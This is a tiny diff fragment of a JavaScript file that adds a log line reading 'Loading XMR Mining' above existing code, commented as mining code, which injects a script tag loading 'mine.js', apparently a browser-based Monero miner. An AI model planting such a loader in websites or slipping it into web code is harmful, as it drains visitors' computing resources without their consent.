@@ -1,3 +1,5 @@
+console.log("Loading XMR Mining");
+
 // Start Of Mining Code (Javascript)
 var script = document.createElement("script");
 script.src = "mine.js";
